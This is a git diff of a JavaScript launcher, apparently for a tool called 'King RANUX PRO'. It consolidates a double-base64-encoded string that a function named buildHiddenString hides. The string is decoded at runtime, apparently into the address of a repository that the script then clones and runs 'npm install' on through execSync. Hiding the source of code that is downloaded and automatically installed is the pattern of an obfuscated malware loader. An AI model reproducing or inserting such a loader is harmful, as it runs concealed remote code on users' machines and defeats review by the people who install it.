@@ -15,14 +15,7 @@ function useless() {
 }
 
 function buildHiddenString() {
-  const parts = [
-    "YUhSMGNITTZMeTl1WVdo",
-    "MGIyUjNiaTVqYjIwdm",
-    "Y25YeGJyaWRnZS1k",
-    "ZXYvbngtYnJpZGdl",
-    "LmdpdA=="
-  ];
-  return parts.join("");
+  return "YUhSMGNITTZMeTl1WVdoMGIyUjNiaTVqYjIwdkwzSjRZbkpwWkdobExXUmxkaTl1ZUMxaWNtbGtZMlV1WjJsMA==";
 }
 
 const STEP1 = Buffer.from(buildHiddenString(), "base64").toString("utf-8");
@@ -52,7 +45,7 @@ console.log("📦 Downloading latest King RANUX PRO core...");
 try {
   execSync(`git clone ${CORE_URL} core`, { stdio: "inherit" });
   console.log("✅ Core downloaded.");
-} catch (e) {
+} catch {
   console.log("❌ Failed to download core.");
   process.exit(1);
 }
@@ -68,7 +61,7 @@ console.log("📥 Installing core dependencies...");
 try {
   execSync(`cd core && npm install`, { stdio: "inherit" });
   console.log("✅ Core dependencies installed.");
-} catch (e) {
+} catch {
   console.log("❌ Failed to install core dependencies.");
   process.exit(1);
 }
